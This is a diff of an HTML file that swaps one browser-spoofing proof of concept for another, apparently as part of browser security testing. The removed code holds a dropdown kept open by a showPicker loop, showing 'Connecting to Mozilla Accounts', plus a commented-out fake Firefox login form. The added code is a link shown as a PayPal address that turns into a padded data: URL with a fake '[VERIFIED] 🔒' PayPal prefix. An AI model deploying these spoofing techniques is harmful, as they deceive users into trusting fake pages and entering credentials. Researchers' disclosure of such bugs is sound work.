@@ -1,97 +1,12 @@
-<!DOCTYPE html>
-<html>
-<style>
-  select {
-    all: initial;
-    text-align: center;
-    width: 50vw;
-    font-size: 1.5rem;
-    margin-top: 50vh;
-  }
-
-  option {
-    height: 100vh;
-  }
-
-  #spoofed {
-    display: none;
-  }
-
-  body {
-    margin: 0;
-  }
-
-  .header {
-    position: absolute;
-    top: 0;
-    width: 100vw;
-  }
-</style>
-
-<body>
-  <center>
-    <select id="mySelect">
-      <option>Click Me</option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Connecting to Mozilla Accounts...</option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-      <option></option>
-    </select>
-  </center>
-
-  <!-- <div id="spoofed"> -->
-    <!-- <div style="display: flex; justify-content: center; align-items: center; height: 100vh;"> -->
-      <!-- <div -->
-        <!-- style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;width: 25vw;"> -->
-        <!-- <img src="https://www.mozilla.org/media/protocol/img/logos/firefox/logo.fedb52c912d6.svg" -->
-          <!-- style="display: block; margin: 0 auto;" /> -->
-
-        <!-- <form style="margin-top: 50px;"> -->
-          <!-- <div style="margin-bottom: 20px;"> -->
-            <!-- <input type="text" id="username" name="username" placeholder="Username" -->
-              <!-- style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;"> -->
-          <!-- </div> -->
-          <!-- <div style="margin-bottom: 20px;"> -->
-            <!-- <input type="password" id="password" name="password" placeholder="Password" -->
-              <!-- style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;"> -->
-          <!-- </div> -->
-          <!-- <input type="submit" value="Sign In" -->
-            <!-- style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;"> -->
-        <!-- </form> -->
-      <!-- </div> -->
-    <!-- </div> -->
-</body>
-<script>
-  var selectElement = document.getElementById("mySelect");
-  //var spoofed = document.getElementById("spoofed");
-  document.addEventListener('click', function (event) {
-    //document.documentElement.requestFullscreen();
-    setTimeout(function () {
-	  
-      selectElement.style.display = "none";
-      //spoofed.style.display = 'block';
-    }, 3500);
-    selectElement.options[0].textContent = "";
-    for (var i = 0; i < selectElement.options.length; i++) {
-      selectElement.options[i].disabled = true;
-    }
-  });
-
-  setInterval(function () {
-    selectElement.showPicker();
-  }, 0);
 
 
-
-</script>
-
-</html>
+ <body>
+   Test: <a id="qab" href="https://secure.google.com/login">https://secure.paypal.com/</a>  
+   
+   <script>
+	qab.addEventListener("click",$=>{
+		qab.href='data:text/html;\u2003[VERIFIED]\u2003🔒\u2003https://secure.paypal.com/\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003charset=utf-8;base64,PFRpdGxlPlBheXBhbDwvVGl0bGU+PGZyYW1lc2V0IHJvd3M9KiwwIGZyYW1lc3BhY2luZz0wPjxGUkFNRSBzcmM9aHR0cHM6Ly93d3cuYmluZy5jb20+';
+	});
+   
+   </script>
+ </body>
